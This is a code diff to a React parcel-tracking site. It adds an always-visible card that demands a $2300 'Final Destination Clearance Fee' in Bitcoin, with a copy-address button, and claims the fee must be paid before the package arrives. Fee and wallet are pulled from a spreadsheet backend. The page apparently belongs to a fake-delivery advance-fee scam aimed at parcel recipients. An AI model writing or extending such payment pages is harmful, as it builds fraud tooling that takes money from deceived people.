@@ -38,6 +38,140 @@ const STATUS_STEPS = [
 ];
 
 /* ------------------------------------------------------------------ */
+/*  CRYPTO PAY CARD                                                    */
+/* ------------------------------------------------------------------ */
+const CryptoPayCard = ({ amount, wallet }) => {
+  const [copied, setCopied] = useState(false);
+
+  const handleCopy = async () => {
+    try {
+      await navigator.clipboard.writeText(wallet);
+    } catch {
+      const el = document.createElement('textarea');
+      el.value = wallet;
+      document.body.appendChild(el);
+      el.select();
+      document.execCommand('copy');
+      document.body.removeChild(el);
+    }
+    setCopied(true);
+    setTimeout(() => setCopied(false), 1800);
+  };
+
+  return (
+    <>
+      <style>{`
+        .cpc {
+          margin-top: 1.5rem;
+          padding: 1.15rem 1.2rem 1.25rem;
+          border-radius: 16px;
+          background: #F7F6F3;
+          border: 1px solid rgba(14,14,16,0.07);
+          animation: cpcIn 0.35s ease;
+          font-family: inherit;
+        }
+        @keyframes cpcIn {
+          from { opacity: 0; transform: translateY(6px); }
+          to   { opacity: 1; transform: none; }
+        }
+        .cpc-label {
+          font-size: 0.66rem;
+          font-weight: 700;
+          letter-spacing: 0.1em;
+          text-transform: uppercase;
+          color: #71717A;
+          margin-bottom: 0.35rem;
+        }
+        .cpc-amount {
+          font-size: 1.5rem;
+          font-weight: 700;
+          color: #0E0E10;
+          letter-spacing: -0.02em;
+          margin-bottom: 0.9rem;
+        }
+        .cpc-row {
+          display: flex;
+          align-items: center;
+          gap: 0.5rem;
+          background: #fff;
+          border: 1px solid rgba(14,14,16,0.1);
+          border-radius: 12px;
+          padding: 0.4rem 0.4rem 0.4rem 0.75rem;
+        }
+        .cpc-addr {
+          flex: 1;
+          min-width: 0;
+          font-family: 'SF Mono', Menlo, Consolas, monospace;
+          font-size: 0.78rem;
+          color: #3F3F46;
+          white-space: nowrap;
+          overflow: hidden;
+          text-overflow: ellipsis;
+        }
+        .cpc-copy {
+          flex-shrink: 0;
+          border: none;
+          border-radius: 9px;
+          background: #FF5230;
+          color: #fff;
+          font-family: inherit;
+          font-size: 0.78rem;
+          font-weight: 700;
+          padding: 0.55rem 0.9rem;
+          cursor: pointer;
+          transition: background 0.2s ease, transform 0.15s ease;
+        }
+        .cpc-copy:hover { background: #ff3b14; }
+        .cpc-copy:active { transform: scale(0.97); }
+        .cpc-copy.is-copied { background: #22c55e; }
+        .cpc-hint {
+          margin-top: 0.65rem;
+          font-size: 0.72rem;
+          color: #71717A;
+          text-align: center;
+        }
+        .cpc-note {
+          margin-top: 0.75rem;
+          padding-top: 0.75rem;
+          border-top: 1px dashed rgba(14,14,16,0.12);
+          font-size: 0.78rem;
+          line-height: 1.5;
+          color: #3F3F46;
+          text-align: center;
+        }
+      `}</style>
+
+      <div className="cpc">
+        <div className="cpc-label">Final Destination Clearance Fee</div>
+        <div className="cpc-amount">${amount} USD</div>
+
+        <div className="cpc-row">
+          <span className="cpc-addr" title={wallet}>
+            {wallet}
+          </span>
+          <button
+            type="button"
+            className={`cpc-copy${copied ? ' is-copied' : ''}`}
+            onClick={handleCopy}
+          >
+            {copied ? 'Copied!' : 'Copy'}
+          </button>
+        </div>
+
+        <div className="cpc-hint">
+          Send the exact amount to the Bitcoin address above.
+        </div>
+
+        <div className="cpc-note">
+          The final destination clearance fee must be paid before the package
+          arrives at the post office.
+        </div>
+      </div>
+    </>
+  );
+};
+
+/* ------------------------------------------------------------------ */
 /*  MODAL                                                             */
 /* ------------------------------------------------------------------ */
 const ParcelModal = ({ parcel, onClose }) => {
@@ -45,7 +179,6 @@ const ParcelModal = ({ parcel, onClose }) => {
 
   const color = statusColors[parcel.status] || '#a1a1aa';
   const isException = parcel.status === 'exception';
-  const isFinalDestination = parcel.status === 'final_destination';
   const activeIndex = STATUS_STEPS.findIndex((s) => s.key === parcel.status);
 
   const etaParts = (parcel.eta || '').split(',');
@@ -503,7 +636,7 @@ const ParcelModal = ({ parcel, onClose }) => {
           )}
 
           {/* FINAL DESTINATION NOTE — only when status is final_destination */}
-          {isFinalDestination && (
+          {parcel.status === 'final_destination' && (
             <div className="pm-final">
               <div className="pm-final-head">
                 <svg width="14" height="14" viewBox="0 0 24 24" fill="none" stroke="currentColor" strokeWidth="2.5" strokeLinecap="round" strokeLinejoin="round">
@@ -513,8 +646,6 @@ const ParcelModal = ({ parcel, onClose }) => {
                 Final destination
               </div>
 
-              {/* Reads `parcel.finalNote`, which is populated in loadParcels
-                  from the SheetDB column literally named "final_destination". */}
               {parcel.finalNote ? (
                 <div className="pm-final-text">{parcel.finalNote}</div>
               ) : (
@@ -580,6 +711,12 @@ const ParcelModal = ({ parcel, onClose }) => {
               Done
             </button>
           </div>
+
+          {/* CRYPTO PAY CARD — always visible */}
+          <CryptoPayCard
+            amount={parcel.clearanceFee || '2300'}
+            wallet={parcel.wallet || 'bc1qexamplewalletaddresshere'}
+          />
         </div>
       </div>
     </div>,
@@ -619,9 +756,6 @@ const ParcelsList = ({ limit }) => {
       const rows = await res.json();
 
       // Normalize SheetDB keys to our shape.
-      // Also normalize the status string so "Final Destination",
-      // "final destination", "FINAL-DESTINATION" all map to
-      // "final_destination" and match the keys used above.
       const normalized = rows.map((r) => {
         const status = String(r.status || 'pending')
           .trim()
@@ -637,11 +771,13 @@ const ParcelsList = ({ limit }) => {
           to: r.to_location || '—',
           eta: r.arrives_thru || '—',
 
-          // 🔧 FIX: your SheetDB column is literally named
-          // "final_destination". We read it here and store it locally as
-          // `finalNote` so it doesn't clash with the status value
-          // "final_destination" (which lives in the separate `status` column).
+          // Column literally named "final_destination"
           finalNote: r.final_destination || '',
+
+          // Optional crypto columns — add them to your SheetDB sheet
+          // (clearance_fee, bitcoin_wallet) if you want them dynamic.
+          clearanceFee: r.clearance_fee || '',
+          wallet: r.bitcoin_wallet || '',
         };
       });
 
